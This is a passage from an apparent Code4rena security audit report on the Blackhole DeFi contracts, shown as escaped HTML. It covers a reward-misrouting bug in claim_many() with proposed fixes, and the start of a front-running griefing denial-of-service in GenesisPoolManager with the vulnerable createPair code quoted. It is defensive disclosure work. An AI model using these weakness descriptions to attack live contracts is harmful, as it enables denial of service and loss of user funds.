class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit_for\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eFor better code maintainability, consider refactoring the owner resolution logic to a separate internal function:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getRewardRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen, use this function in both \u003ccode\u003eclaim()\u003c/code\u003e and \u003ccode\u003eclaim_many()\u003c/code\u003e to ensure consistent behavior.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eScenario:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUser A delegates their tokenId #123 to the AVM system.\u003c/li\u003e\n\u003cli\u003eThe lock for tokenId #123 expires.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSomeone calls \u003ccode\u003eclaim(123)\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAVM check triggers and rewards go to User A (correct behavior)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSomeone calls \u003ccode\u003eclaim_many([123])\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNo AVM check happens, rewards go to the AVM contract (incorrect behavior)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eUser A permanently loses their rewards.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-31\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-25\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\" aria-label=\"m 05 griefing attack on genesispoolmanagersoldepositnativetoken leading to denial of service permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-166\"\u003e[M-05] Griefing attack on \u003ccode\u003eGenesisPoolManager.sol::depositNativeToken\u003c/code\u003e leading to Denial of Service\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-122\"\u003eFavourOkerri\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-348\"\u003eAvantGard\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/GenesisPoolFactory.sol#L56-L67\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/factories/PairFactory.sol#L139-L151\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L100-L116\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-3\" aria-label=\"finding description 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe process of depositing native token to a Genesis Pool is vulnerable to a griefing attack, leading to a denial of service (DoS) for legitimate pool creations.\u003c/p\u003e\n\u003cp\u003eThe vulnerability arises from the interaction of the following factors:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePublic information: The \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e addresses intended for a new Genesis Pool become public information when the \u003ccode\u003eGenesisPoolFactory.createGenesisPool\u003c/code\u003e transaction enters the mempool or through the \u003ccode\u003eGenesisCreated\u003c/code\u003e event it emits.\u003c/li\u003e\n\u003cli\u003eUnrestricted pair creation: The \u003ccode\u003epairFactory.createPair\u003c/code\u003e function allows any external actor to create a new liquidity pair for any given tokenA, tokenB, and stable combination, provided a pair for that combination doesn’t already exist.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;IA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: IDENTICAL_ADDRESSES\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: ZERO_ADDRESS\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIPairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Store in reverse direction\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallPairs\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePairCreated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallPairs\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eVulnerable validation: In \u003ccode\u003eGenesisPoolManager.depositNativeToken()\u003c/code\u003e, the protocol checks whether the pair already exists. If so, it requires that both token balances in the pair are zero — but does not verify whether the pair was created by the protocol itself.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container 